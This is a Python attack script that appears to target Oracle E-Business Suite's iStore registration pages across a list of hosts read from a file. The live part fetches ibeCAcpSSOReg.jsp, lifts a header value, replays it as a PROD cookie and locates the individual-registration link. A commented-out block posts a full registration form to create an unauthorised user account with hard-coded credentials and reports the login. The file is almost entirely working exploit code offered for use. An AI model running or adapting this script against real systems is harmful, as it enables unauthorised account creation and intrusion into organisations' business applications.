import requests
import sys
import json
from bs4 import BeautifulSoup
import re
from colorama import init, Fore, Back, Style
init(convert=True)


list_cve = sys.argv[1]
with open(list_cve, 'r') as file:
    for target in file:
        end_point = target[:target.rfind("/")]
        last_end_point = end_point + str("/ibeCAcpSSOReg.jsp")
        #print(Fore.GREEN +"Trying to exploit: " + Style.RESET_ALL +last_end_point)
        for i in range(1):
            try:
                r = requests.get(last_end_point)
                rr = dict(r.headers)
                rrr = json.dumps(rr)
                header = rrr[219:245]
                Prod_header = "PROD=" +header
                headers = {'Cookie': Prod_header}
                r = requests.get(last_end_point, headers=headers)    
                if "Register as individual" in r.text:
                    soup = BeautifulSoup(r.text, 'html.parser')
                    for link in soup.find_all('a', attrs={'href': re.compile("IBE_INDIVIDUAL")}):
                        last_endpoint = link.get('href')
                        print(Fore.GREEN + "Register Account Page: " + Style.RESET_ALL+ end_point + "/" + last_endpoint)
                        print("#####################################################################")
                #         print(Fore.YELLOW +"Trying to register account.......")
                #     burp0_url = end_point + "/ibeCRgpIndividualUser.jsp"
                #     burp0_data = {"ds": "0", "category": "template", "ref": '', "noshowcontact": "Y", "target": "ibeCRgdEnrollFail.jsp?a=b", "_hideConfirmation": "Y", "tmpl_ut_id": "10041.00000", "ref": '', "jtt_uua": "n", "category": "template", "tmpl_action": "browse", "usertype_template": "STORE_REG_B2C_CREATE_D?tmpl_id=10060", "tmpl_ut": "IBE_INDIVIDUAL", "tmpl_ut": "IBE_INDIVIDUAL", "utHandler": "oracle.apps.ibe.um.RegisterIndividual", "tmp": "STORE_REG_CONTAINER_D", "_sendConfirmationEmail": "N", "_regErrorPage": "ibeCRgdError.jsp", "listenrollment": "true", "regSubmit": '', "emailIsUsername": "N", "firstname": "testaccu1", "middlename": '', "lastname": "0x7", "user.email": "el7ot2085@gmail.com", "workPhCountryCode": '', "workAreaCode": '', "workNumber": '', "workExtension": '', "homePhCountryCode": '', "homeAreaCode": '', "homeNumber": '', "homeExtension": '', "faxPhCountryCode": '', "faxAreaCode": '', "faxNumber": '', "faxExtension": '', "user.userid": "testaccu1", "user.verifypassword": "@D7k_2023", "confirmPassword": "@D7k_2023", "ibe_listenrollment": "false", "subscriptions": "10060", "subscriptions": "10080"}
                #     p = requests.post(burp0_url, headers=headers, data=burp0_data)
                #     if "No accessible site found" in p.text:
                #         print(Fore.GREEN + "User created sucessfully, login: " + Style.RESET_ALL + end_point +"/AppsLocalLogin.jsp")
                #         print(Fore.YELLOW +"Username: " + Style.RESET_ALL + "testaccu1")
                #         print(Fore.YELLOW +"Password: " + Style.RESET_ALL + "@D7k_2023"+ Style.RESET_ALL)
                #         print("#####################################################################")
                #     else:
                #         print(Fore.RED +"Failed to register account" + Style.RESET_ALL)
                # else:
                #     print(Fore.RED +"Failed to exploit: " + last_end_point + Style.RESET_ALL)
                #     print("#####################################################################")
            except requests.exceptions.RequestException as e:
                print(Fore.RED +"Time out for: " + Style.RESET_ALL + last_end_point)
                print("#####################################################################")
